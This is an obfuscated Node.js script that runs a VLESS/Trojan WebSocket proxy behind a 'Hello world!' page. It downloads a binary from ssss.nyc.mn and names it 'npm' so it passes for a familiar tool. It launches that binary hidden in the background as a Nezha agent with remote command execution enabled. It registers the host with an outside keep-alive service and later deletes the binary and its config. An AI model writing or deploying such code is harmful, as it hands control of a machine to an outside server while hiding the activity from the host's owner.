const _0x73ef0f=_0x4611;(function(_0x5af174,_0x27dddb){const _0x6a101b=_0x4611,_0x4781cd=_0x5af174();while(!![]){try{const _0x2599d0=-parseInt(_0x6a101b(0x1d7))/0x1+parseInt(_0x6a101b(0x23e))/0x2+-parseInt(_0x6a101b(0x1fe))/0x3+parseInt(_0x6a101b(0x1dd))/0x4+parseInt(_0x6a101b(0x227))/0x5*(parseInt(_0x6a101b(0x1d6))/0x6)+parseInt(_0x6a101b(0x1d0))/0x7+-parseInt(_0x6a101b(0x1ed))/0x8*(parseInt(_0x6a101b(0x1d8))/0x9);if(_0x2599d0===_0x27dddb)break;else _0x4781cd['push'](_0x4781cd['shift']());}catch(_0x11981e){_0x4781cd['push'](_0x4781cd['shift']());}}}(_0x27b2,0x42ab9));function _0x27b2(){const _0x39f1ed=['https://','connection','text/html','post','data','toString','find','readFile','Server\x20is\x20running\x20on\x20port\x20','isp','error','test','arm64','Automatic\x20Access\x20Task\x20added\x20successfully','2096','slice','NEZHA_KEY','env','2083','8.8.4.4','162356CaRmij','setsid\x20nohup\x20./npm\x20-s\x20','--tls','npm\x20is\x20running','5d7f1c4a-9f8b-4e5c-a6d2-bde3f0f9c4f6','child_process','net','writeHead','includes','https://amd64.ssss.nyc.mn/agent','listen','https://arm64.ssss.nyc.mn/agent','PORT','2699123KmUoBt','update','\x20with\x20all\x20DNS\x20servers',':443?encryption=none&security=tls&sni=','connect','npm\x20is\x20already\x20running,\x20skip\x20running...','6ANVVqX','180586IsUqjx','99IHFPmC','SUB_PATH','path','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','987024PziOpT','config.yaml','reduce','8443','/bin/bash','decode','text/plain',':443?security=tls&sni=','readUInt16BE','Not\x20Found\x0a','writeFileSync','hex','arch','\x20-p\x20','write','concat','42480FPnqZi','1.1.1.1','UUID','https://arm64.ssss.nyc.mn/v1','replace','url','error:\x20','log','trim','sub','&fp=chrome&type=ws&host=','NEZHA_SERVER','npm','crypto','substr','unlink','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','912315wkMsyr','client_secret:\x20','index.html','&path=%2F','https://api.ip.sb/geoip','vless://','DOMAIN','application/json','country_code','axios','true','join','base64','NEZHA_PORT','443','createHash','npm\x20download\x20successfully','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','once','aarch64','false','application/dns-json','map','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','catch','trojan://','end','sha224','close','http','arm','readUInt8','message','pop','pipe','Answer','get','2053','every','createServer','1234.abc.com','513295VmZZbM','then','type'];_0x27b2=function(){return _0x39f1ed;};return _0x27b2();}const os=require('os'),http=require(_0x73ef0f(0x21b)),fs=require('fs'),axios=require(_0x73ef0f(0x207)),net=require(_0x73ef0f(0x244)),path=require(_0x73ef0f(0x1da)),crypto=require(_0x73ef0f(0x1fa)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x73ef0f(0x243)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x73ef0f(0x1ef)]||_0x73ef0f(0x242),NEZHA_SERVER=process[_0x73ef0f(0x23b)][_0x73ef0f(0x1f8)]||'',NEZHA_PORT=process[_0x73ef0f(0x23b)][_0x73ef0f(0x20b)]||'',NEZHA_KEY=process[_0x73ef0f(0x23b)][_0x73ef0f(0x23a)]||'',DOMAIN=process['env'][_0x73ef0f(0x204)]||_0x73ef0f(0x226),AUTO_ACCESS=process[_0x73ef0f(0x23b)]['AUTO_ACCESS']||!![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x73ef0f(0x23b)][_0x73ef0f(0x1d9)]||_0x73ef0f(0x1f6),NAME=process[_0x73ef0f(0x23b)]['NAME']||'',PORT=process[_0x73ef0f(0x23b)][_0x73ef0f(0x1cf)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x515b93=_0x73ef0f;try{const _0x859b5f=await axios[_0x515b93(0x222)](_0x515b93(0x202)),_0x3b0249=_0x859b5f['data'];ISP=(_0x3b0249[_0x515b93(0x206)]+'-'+_0x3b0249[_0x515b93(0x233)])['replace'](/ /g,'_');}catch(_0x115c72){ISP='Unknown';}};function _0x4611(_0x1aa269,_0x1056e5){_0x1aa269=_0x1aa269-0x1cc;const _0x27b2b6=_0x27b2();let _0x4611b6=_0x27b2b6[_0x1aa269];return _0x4611b6;}GetISP();const httpServer=http[_0x73ef0f(0x225)]((_0x364912,_0x77eee2)=>{const _0x28624c=_0x73ef0f;if(_0x364912[_0x28624c(0x1f2)]==='/'){const _0x5afdf9=path[_0x28624c(0x209)](__dirname,_0x28624c(0x200));fs[_0x28624c(0x231)](_0x5afdf9,'utf8',(_0x3043eb,_0x2c5dcf)=>{const _0x43ab32=_0x28624c;if(_0x3043eb){_0x77eee2['writeHead'](0xc8,{'Content-Type':_0x43ab32(0x22c)}),_0x77eee2[_0x43ab32(0x218)]('Hello\x20world!');return;}_0x77eee2['writeHead'](0xc8,{'Content-Type':_0x43ab32(0x22c)}),_0x77eee2['end'](_0x2c5dcf);});return;}else{if(_0x364912[_0x28624c(0x1f2)]==='/'+SUB_PATH){const _0x5c71e6=NAME?NAME+'-'+ISP:ISP,_0x38dab2=_0x28624c(0x203)+UUID+'@'+DOMAIN+_0x28624c(0x1d3)+DOMAIN+_0x28624c(0x1f7)+DOMAIN+_0x28624c(0x201)+WSPATH+'#'+_0x5c71e6,_0x6150a1=_0x28624c(0x217)+UUID+'@'+DOMAIN+_0x28624c(0x1e4)+DOMAIN+_0x28624c(0x1f7)+DOMAIN+_0x28624c(0x201)+WSPATH+'#'+_0x5c71e6,_0x588fbb=_0x38dab2+'\x0a'+_0x6150a1,_0x65fba2=Buffer['from'](_0x588fbb)[_0x28624c(0x22f)](_0x28624c(0x20a));_0x77eee2['writeHead'](0xc8,{'Content-Type':_0x28624c(0x1e3)}),_0x77eee2[_0x28624c(0x218)](_0x65fba2+'\x0a');}else _0x77eee2[_0x28624c(0x245)](0x194,{'Content-Type':'text/plain'}),_0x77eee2[_0x28624c(0x218)](_0x28624c(0x1e6));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x73ef0f(0x1f1)](/-/g,''),DNS_SERVERS=[_0x73ef0f(0x23d),_0x73ef0f(0x1ee)];function resolveHost(_0x3587ef){return new Promise((_0x442166,_0x3c8e60)=>{const _0x417dc2=_0x4611;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x417dc2(0x235)](_0x3587ef)){_0x442166(_0x3587ef);return;}let _0x13b545=0x0;function _0x5e3f29(){const _0x53ba91=_0x417dc2;if(_0x13b545>=DNS_SERVERS[_0x53ba91(0x1db)]){_0x3c8e60(new Error('Failed\x20to\x20resolve\x20'+_0x3587ef+_0x53ba91(0x1d2)));return;}const _0x2fb23e=DNS_SERVERS[_0x13b545];_0x13b545++;const _0x277a14='https://dns.google/resolve?name='+encodeURIComponent(_0x3587ef)+'&type=A';axios[_0x53ba91(0x222)](_0x277a14,{'timeout':0x1388,'headers':{'Accept':_0x53ba91(0x213)}})['then'](_0x39fd7d=>{const _0x4d3ab3=_0x53ba91,_0x525e1b=_0x39fd7d[_0x4d3ab3(0x22e)];if(_0x525e1b['Status']===0x0&&_0x525e1b['Answer']&&_0x525e1b[_0x4d3ab3(0x221)][_0x4d3ab3(0x1db)]>0x0){const _0x33b7f7=_0x525e1b[_0x4d3ab3(0x221)][_0x4d3ab3(0x230)](_0x6c5de3=>_0x6c5de3[_0x4d3ab3(0x229)]===0x1);if(_0x33b7f7){_0x442166(_0x33b7f7['data']);return;}}_0x5e3f29();})[_0x53ba91(0x216)](_0x7b4741=>{_0x5e3f29();});}_0x5e3f29();});}function handleVlessConnection(_0x37ffa3,_0x53f20a){const _0x3ea5a4=_0x73ef0f,[_0x3e19e4]=_0x53f20a,_0x3812a5=_0x53f20a['slice'](0x1,0x11);if(!_0x3812a5[_0x3ea5a4(0x224)]((_0x6cfd5f,_0x23d951)=>_0x6cfd5f==parseInt(uuid[_0x3ea5a4(0x1fb)](_0x23d951*0x2,0x2),0x10)))return![];let _0x28be4e=_0x53f20a['slice'](0x11,0x12)[_0x3ea5a4(0x21d)]()+0x13;const _0x439fc2=_0x53f20a[_0x3ea5a4(0x239)](_0x28be4e,_0x28be4e+=0x2)[_0x3ea5a4(0x1e5)](0x0),_0x4a311e=_0x53f20a[_0x3ea5a4(0x239)](_0x28be4e,_0x28be4e+=0x1)[_0x3ea5a4(0x21d)](),_0x3ce96b=_0x4a311e==0x1?_0x53f20a[_0x3ea5a4(0x239)](_0x28be4e,_0x28be4e+=0x4)['join']('.'):_0x4a311e==0x2?new TextDecoder()[_0x3ea5a4(0x1e2)](_0x53f20a['slice'](_0x28be4e+0x1,_0x28be4e+=0x1+_0x53f20a[_0x3ea5a4(0x239)](_0x28be4e,_0x28be4e+0x1)[_0x3ea5a4(0x21d)]())):_0x4a311e==0x3?_0x53f20a['slice'](_0x28be4e,_0x28be4e+=0x10)[_0x3ea5a4(0x1df)]((_0x462e1a,_0x2d4ecc,_0x444f5e,_0x13d278)=>_0x444f5e%0x2?_0x462e1a[_0x3ea5a4(0x1ec)](_0x13d278['slice'](_0x444f5e-0x1,_0x444f5e+0x1)):_0x462e1a,[])['map'](_0x2b0e11=>_0x2b0e11[_0x3ea5a4(0x1e5)](0x0)['toString'](0x10))[_0x3ea5a4(0x209)](':'):'';_0x37ffa3['send'](new Uint8Array([_0x3e19e4,0x0]));const _0x47630f=createWebSocketStream(_0x37ffa3);return resolveHost(_0x3ce96b)['then'](_0x13fc38=>{const _0x3d56aa=_0x3ea5a4;net['connect']({'host':_0x13fc38,'port':_0x439fc2},function(){const _0x14df98=_0x4611;this[_0x14df98(0x1eb)](_0x53f20a['slice'](_0x28be4e)),_0x47630f['on'](_0x14df98(0x234),()=>{})['pipe'](this)['on']('error',()=>{})[_0x14df98(0x220)](_0x47630f);})['on'](_0x3d56aa(0x234),()=>{});})[_0x3ea5a4(0x216)](_0x153b06=>{const _0xd89d90=_0x3ea5a4;net[_0xd89d90(0x1d4)]({'host':_0x3ce96b,'port':_0x439fc2},function(){const _0x4bd1c0=_0xd89d90;this[_0x4bd1c0(0x1eb)](_0x53f20a[_0x4bd1c0(0x239)](_0x28be4e)),_0x47630f['on']('error',()=>{})[_0x4bd1c0(0x220)](this)['on']('error',()=>{})[_0x4bd1c0(0x220)](_0x47630f);})['on'](_0xd89d90(0x234),()=>{});}),!![];}function handleTrojanConnection(_0x4728ac,_0x28709b){const _0xe6895e=_0x73ef0f;try{if(_0x28709b['length']<0x3a)return![];const _0x308e11=_0x28709b[_0xe6895e(0x239)](0x0,0x38)['toString'](),_0x47e8ab=[UUID];let _0x2988b7=null;for(const _0x578d61 of _0x47e8ab){const _0x31cdf7=crypto[_0xe6895e(0x20d)](_0xe6895e(0x219))[_0xe6895e(0x1d1)](_0x578d61)['digest'](_0xe6895e(0x1e8));if(_0x31cdf7===_0x308e11){_0x2988b7=_0x578d61;break;}}if(!_0x2988b7)return![];let _0x1f6aca=0x38;_0x28709b[_0x1f6aca]===0xd&&_0x28709b[_0x1f6aca+0x1]===0xa&&(_0x1f6aca+=0x2);const _0x3d15f9=_0x28709b[_0x1f6aca];if(_0x3d15f9!==0x1)return![];_0x1f6aca+=0x1;const _0x1622fe=_0x28709b[_0x1f6aca];_0x1f6aca+=0x1;let _0x286fb6,_0x20f159;if(_0x1622fe===0x1)_0x286fb6=_0x28709b['slice'](_0x1f6aca,_0x1f6aca+0x4)['join']('.'),_0x1f6aca+=0x4;else{if(_0x1622fe===0x3){const _0x505556=_0x28709b[_0x1f6aca];_0x1f6aca+=0x1,_0x286fb6=_0x28709b[_0xe6895e(0x239)](_0x1f6aca,_0x1f6aca+_0x505556)[_0xe6895e(0x22f)](),_0x1f6aca+=_0x505556;}else{if(_0x1622fe===0x4)_0x286fb6=_0x28709b[_0xe6895e(0x239)](_0x1f6aca,_0x1f6aca+0x10)[_0xe6895e(0x1df)]((_0x12ac96,_0x2a5bad,_0x1a4257,_0x21111a)=>_0x1a4257%0x2?_0x12ac96[_0xe6895e(0x1ec)](_0x21111a[_0xe6895e(0x239)](_0x1a4257-0x1,_0x1a4257+0x1)):_0x12ac96,[])[_0xe6895e(0x214)](_0x2d72df=>_0x2d72df[_0xe6895e(0x1e5)](0x0)[_0xe6895e(0x22f)](0x10))['join'](':'),_0x1f6aca+=0x10;else return![];}}_0x20f159=_0x28709b[_0xe6895e(0x1e5)](_0x1f6aca),_0x1f6aca+=0x2;_0x1f6aca<_0x28709b[_0xe6895e(0x1db)]&&_0x28709b[_0x1f6aca]===0xd&&_0x28709b[_0x1f6aca+0x1]===0xa&&(_0x1f6aca+=0x2);const _0x6dace0=createWebSocketStream(_0x4728ac);return resolveHost(_0x286fb6)[_0xe6895e(0x228)](_0x3577cf=>{const _0x33f61b=_0xe6895e;net[_0x33f61b(0x1d4)]({'host':_0x3577cf,'port':_0x20f159},function(){const _0x5c77a8=_0x33f61b;_0x1f6aca<_0x28709b['length']&&this['write'](_0x28709b['slice'](_0x1f6aca)),_0x6dace0['on'](_0x5c77a8(0x234),()=>{})[_0x5c77a8(0x220)](this)['on'](_0x5c77a8(0x234),()=>{})['pipe'](_0x6dace0);})['on'](_0x33f61b(0x234),()=>{});})[_0xe6895e(0x216)](_0x39eb08=>{const _0x1e9b28=_0xe6895e;net[_0x1e9b28(0x1d4)]({'host':_0x286fb6,'port':_0x20f159},function(){const _0x579851=_0x1e9b28;_0x1f6aca<_0x28709b[_0x579851(0x1db)]&&this[_0x579851(0x1eb)](_0x28709b['slice'](_0x1f6aca)),_0x6dace0['on'](_0x579851(0x234),()=>{})['pipe'](this)['on'](_0x579851(0x234),()=>{})[_0x579851(0x220)](_0x6dace0);})['on'](_0x1e9b28(0x234),()=>{});}),!![];}catch(_0x4ad576){return![];}}wss['on'](_0x73ef0f(0x22b),(_0x11b4f7,_0x4f9da3)=>{const _0x73a4e1=_0x73ef0f,_0x37d6e3=_0x4f9da3[_0x73a4e1(0x1f2)]||'';_0x11b4f7[_0x73a4e1(0x210)](_0x73a4e1(0x21e),_0x59ea95=>{const _0xabb11a=_0x73a4e1;if(_0x59ea95[_0xabb11a(0x1db)]>0x11&&_0x59ea95[0x0]===0x0){const _0x4eb7c4=_0x59ea95['slice'](0x1,0x11),_0x4f8a15=_0x4eb7c4[_0xabb11a(0x224)]((_0x2feeb2,_0x574ea5)=>_0x2feeb2==parseInt(uuid['substr'](_0x574ea5*0x2,0x2),0x10));if(_0x4f8a15){!handleVlessConnection(_0x11b4f7,_0x59ea95)&&_0x11b4f7[_0xabb11a(0x21a)]();return;}}!handleTrojanConnection(_0x11b4f7,_0x59ea95)&&_0x11b4f7[_0xabb11a(0x21a)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x4fc976=_0x73ef0f,_0x59686d=os[_0x4fc976(0x1e9)]();return _0x59686d===_0x4fc976(0x21c)||_0x59686d===_0x4fc976(0x236)||_0x59686d===_0x4fc976(0x211)?!NEZHA_PORT?_0x4fc976(0x1f0):_0x4fc976(0x1ce):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4fc976(0x1cc);},downloadFile=async()=>{const _0x2a88d1=_0x73ef0f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3af21f=getDownloadUrl(),_0x36135f=await axios({'method':_0x2a88d1(0x222),'url':_0x3af21f,'responseType':'stream'}),_0x3cbe8f=fs['createWriteStream']('npm');return _0x36135f[_0x2a88d1(0x22e)][_0x2a88d1(0x220)](_0x3cbe8f),new Promise((_0x425f38,_0x384913)=>{_0x3cbe8f['on']('finish',()=>{const _0x272987=_0x4611;console['log'](_0x272987(0x20e)),exec('chmod\x20+x\x20npm',_0x2aad64=>{if(_0x2aad64)_0x384913(_0x2aad64);_0x425f38();});}),_0x3cbe8f['on']('error',_0x384913);});}catch(_0x5b63e4){throw _0x5b63e4;}},runnz=async()=>{const _0x23c387=_0x73ef0f;try{const _0x373444=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x373444[_0x23c387(0x1f5)]()!==''){console[_0x23c387(0x1f4)](_0x23c387(0x1d5));return;}}catch(_0x5207d4){}await downloadFile();let _0x300891='',_0x48ebae=[_0x23c387(0x20c),_0x23c387(0x1e0),_0x23c387(0x238),'2087',_0x23c387(0x23c),_0x23c387(0x223)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x51946f=_0x48ebae[_0x23c387(0x246)](NEZHA_PORT)?_0x23c387(0x240):'';_0x300891=_0x23c387(0x23f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x23c387(0x1ea)+NEZHA_KEY+'\x20'+_0x51946f+_0x23c387(0x1fd);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb26fb6=NEZHA_SERVER[_0x23c387(0x246)](':')?NEZHA_SERVER['split'](':')[_0x23c387(0x21f)]():'',_0x553997=_0x48ebae[_0x23c387(0x246)](_0xb26fb6)?_0x23c387(0x208):_0x23c387(0x212),_0x545913=_0x23c387(0x1ff)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x23c387(0x1dc)+_0x553997+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x23c387(0x1e7)]('config.yaml',_0x545913);}_0x300891=_0x23c387(0x215);}else{console[_0x23c387(0x1f4)](_0x23c387(0x20f));return;}}try{exec(_0x300891,{'shell':_0x23c387(0x1e1)},_0x13484f=>{const _0x5c58ce=_0x23c387;if(_0x13484f)console[_0x5c58ce(0x234)]('npm\x20running\x20error:',_0x13484f);else console[_0x5c58ce(0x1f4)](_0x5c58ce(0x241));});}catch(_0xceefb1){console['error'](_0x23c387(0x1f3)+_0xceefb1);}};async function addAccessTask(){const _0x201e37=_0x73ef0f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x7e5968=_0x201e37(0x22a)+DOMAIN;try{const _0x1a81d4=await axios[_0x201e37(0x22d)]('https://oooo.serv00.net/add-url',{'url':_0x7e5968},{'headers':{'Content-Type':_0x201e37(0x205)}});console['log'](_0x201e37(0x237));}catch(_0x28405b){}}const delFiles=()=>{const _0x16d5cf=_0x73ef0f;fs[_0x16d5cf(0x1fc)](_0x16d5cf(0x1f9),()=>{}),fs['unlink'](_0x16d5cf(0x1de),()=>{});};httpServer[_0x73ef0f(0x1cd)](PORT,()=>{const _0x3012cc=_0x73ef0f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3012cc(0x1f4)](_0x3012cc(0x232)+PORT);});
